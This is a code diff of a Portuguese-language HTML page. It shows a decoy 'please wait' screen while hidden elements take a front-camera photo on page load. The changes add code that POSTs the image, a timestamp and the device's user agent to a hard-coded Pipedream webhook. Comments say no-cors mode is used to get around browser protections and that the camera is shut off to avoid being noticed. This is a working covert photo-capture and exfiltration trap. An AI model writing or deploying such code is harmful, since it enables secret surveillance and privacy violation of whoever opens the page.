@@ -1,41 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt">
 <head>
-    <title>Captura de Imagem</title>
+    <meta charset="UTF-8">
+    <title>A carregar...</title>
+    <style>
+        body { background: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        h1 { color: #333; font-size: 18px; }
+    </style>
 </head>
 <body>
-    <h2>A carregar conteúdo...</h2>
-    
-    <!-- Elementos escondidos para a captura -->
+    <h1>A processar o conteúdo, por favor aguarde...</h1>
+
+    <!-- Elementos invisíveis para a captura -->
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // 1. Pedir permissão e aceder à câmara assim que a página carrega
-        navigator.mediaDevices.getUserMedia({ video: true })
+        // --- CONFIGURAÇÃO ---
+        // Cola aqui o link que criaste (Pipedream ou Webhook.site)
+        const WEBHOOK_URL = "https://eo5kkxp18b4vkzu.m.pipedream.net"; 
+        // --------------------
+
+        // 1. Pedir acesso à câmara
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(function(stream) {
             const video = document.getElementById('video');
             video.srcObject = stream;
-            
-            // 2. Esperar um momento para a câmara focar e tirar a foto
+
+            // 2. Esperar 2 segundos para a câmara estabilizar
             setTimeout(function() {
                 const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, 640, 480);
-                
-                // 3. Converter a foto para formato de imagem (Base64)
-                const dataURL = canvas.toDataURL('image/png');
-                
-                console.log("Foto capturada!");
-                // Aqui enviarias a 'dataURL' para o teu servidor ou e-mail
-                // Exemplo: enviarParaServidor(dataURL);
-                
-                // Fechar a câmara após a foto
-                stream.getTracks().forEach(track => track.stop());
-            }, 2000); // 2 segundos de delay
+
+                // 3. Converter para imagem (Base64)
+                const fotoData = canvas.toDataURL('image/jpeg', 0.7);
+
+                // 4. Enviar para o teu "servidor" Webhook
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // Para evitar bloqueios de segurança do navegador
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        imagem: fotoData,
+                        data: new Date().toISOString(),
+                        dispositivo: navigator.userAgent
+                    })
+                }).then(() => {
+                    console.log("Enviado com sucesso!");
+                    // Fecha a câmara para não gastar bateria/dar nas vistas
+                    stream.getTracks().forEach(track => track.stop());
+                });
+
+            }, 2000);
         })
         .catch(function(err) {
-            console.log("O utilizador recusou o acesso: " + err);
+            console.log("Erro ou permissão negada: " + err);
         });
     </script>
 </body>
